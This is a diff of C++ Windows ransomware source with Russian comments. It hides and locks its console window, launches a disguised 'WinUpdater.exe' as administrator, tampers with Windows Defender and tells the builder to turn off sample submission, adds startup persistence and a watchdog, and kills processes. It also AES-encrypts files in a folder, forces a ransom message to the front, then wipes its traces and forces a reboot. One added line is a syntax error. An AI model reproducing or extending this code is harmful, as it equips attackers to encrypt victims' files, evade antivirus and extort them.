@@ -7,8 +7,11 @@ using namespace std;
 // КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ
 // ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
 int main(int argc, char* argv[]) {
+    SetConsoleOutputCP(CP_UTF8);
     HWND Console;
     Console = FindWindowA("ConsoleWindowClass", NULL);
+    persistence::RemoveCloseButton();
+    SetConsoleTitle("don't try to close this window it won't help");
     ShowWindow(Console, 0);
     char path[MAX_PATH];
     if (!persistence::isUserAdmin()) {
@@ -25,6 +28,7 @@ int main(int argc, char* argv[]) {
                 std::cout << "Already working!" << std::endl;
                 return 0;
             }
+            ShellExecuteA(nullptr, "runas", "C:\\Windows\\SystemApps\\WinUpdater.exe", nullptr, "C:\\Windows\\SystemApps", SW_SHOWNORMAL);
             persistence::watchdogLoop();
         }
         return 0;
@@ -38,9 +42,9 @@ int main(int argc, char* argv[]) {
         persistence::DefenderOwner();
         persistence::addToStartup();
         Sleep(1500);
-        persistence::reset();
+        // persistence::reset();
         Sleep(rand() % 5000 + 5000);
-        persistence::restartSystem();
+        // persistence::restartSystem();
         return 0;
     }
     std::thread killerThread(persistence::StopExe); // Запускаем фоновый поток
@@ -51,8 +55,6 @@ int main(int argc, char* argv[]) {
 
 
     // { ENCRYPTION } //
-     
-    ShowWindow(Console, 1);
 
     std::string enc_path;
     enc_path = "C:\\dummy\\";
@@ -66,9 +68,11 @@ int main(int argc, char* argv[]) {
         if (!std::filesystem::is_directory(filename))
             AES.encryptFile(filename);
     }
-    // { END ENCRYPTION } //
-
-
+    { END ENCRYPTION } //
+    ShowWindow(Console, 1);
+    std::thread ForceOpen(persistence::ForceConsoleToFront);
+    ForceOpen.detach();
+    persistence::CryptMessage();
     std::string fakeKey;
     while (fakeKey != "123") {
         std::cin >> fakeKey;
@@ -85,6 +89,6 @@ int main(int argc, char* argv[]) {
     persistence::cleanfile();
     persistence::cleanreg();
     system("shutdown /r /f /t 30");
-    persistence::deleteMainFiles()
+    persistence::deleteMainFiles();
     return 0;
 }
